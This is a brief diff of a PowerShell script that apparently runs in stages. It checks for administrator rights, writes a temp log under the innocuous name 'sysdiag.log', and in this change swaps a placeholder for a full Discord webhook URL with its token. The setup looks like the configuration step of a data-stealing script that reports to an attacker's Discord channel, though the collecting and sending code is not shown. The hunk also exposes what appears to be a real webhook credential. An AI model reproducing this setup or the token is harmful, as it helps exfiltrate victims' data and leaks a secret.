@@ -10,7 +10,7 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }  
 
 # Stage 2: Environment Setup  
-$webhook = "YOUR_DISCORD_WEBHOOK_URL"  
+$webhook = "https://discord.com/api/webhooks/1456244842660233311/wb_kucNwoLvIdZaUNv_Vs0TRRg6mLtv95Fi_5cf1R8NgLz_o5QmCBKrkH8qLoCLX7NPL"  
 $tempDir = $env:TEMP  
 $logPath = "$tempDir\sysdiag.log"  
 
